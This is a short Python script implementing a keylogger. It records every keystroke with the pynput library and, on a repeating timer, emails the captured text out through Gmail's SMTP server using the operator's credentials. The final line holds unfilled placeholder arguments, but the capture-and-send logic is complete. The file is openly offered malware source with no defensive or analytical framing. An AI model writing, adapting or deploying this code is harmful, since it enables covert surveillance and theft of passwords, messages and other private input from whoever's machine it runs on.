#!/usr/bin/python3
import pynput
from pynput.keyboard import Key, Listener
import time
import threading
import smtplib

class keylogger:
    
    def __init__(self,email,password,inter):
        self.output =''
        self.keys=[]
        self.inter = inter
        self.email = email
        self.password = password

    def key_press(self,key):
        self.keys.append(str(key).strip("''"))
        
    def parse(self):
        for i in self.keys:
            if (i=='Key.space'):
                i=" "
            if (i=='Key.tab'):
                i='\n'
            self.output= self.output+i
        return self.output

    def send_mail(self):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(self.email,self.password)
        server.sendmail(self.email,self.email,self.output)
        server.quit()

    def report(self):
        self.parse()
        self.send_mail()
        self.output =''
        r = threading.Timer(self.inter,self.report)
        r.start()

    def start(self):
        with Listener(on_press=self.key_press) as listner:
            self.report()
            listner.join()

test = keylogger(your email,your password,seconds to update)
test.start()